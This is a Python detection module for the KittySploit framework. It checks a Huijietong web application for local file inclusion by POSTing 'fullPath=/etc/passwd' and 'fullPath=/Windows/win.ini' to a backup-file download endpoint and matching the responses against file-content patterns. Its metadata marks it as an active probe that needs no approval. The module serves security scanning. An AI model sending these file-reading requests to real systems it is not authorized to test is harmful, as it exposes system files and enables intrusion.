#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Huijietong is vulnerable to local file inclusion."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Huijietong - Local File Inclusion Detection',
        'description': 'Huijietong is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'huijietong', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
    }

    def run(self):
        path = '/fileDownload?action=downloadBackupFile'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='fullPath=/etc/passwd')
        if not r:
            return False
        path = '/fileDownload?action=downloadBackupFile'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='fullPath=/Windows/win.ini')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', '\\[(font|extension|file)s\\]',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Huijietong - Local File Inclusion detected', path=path)
            return True
        return False

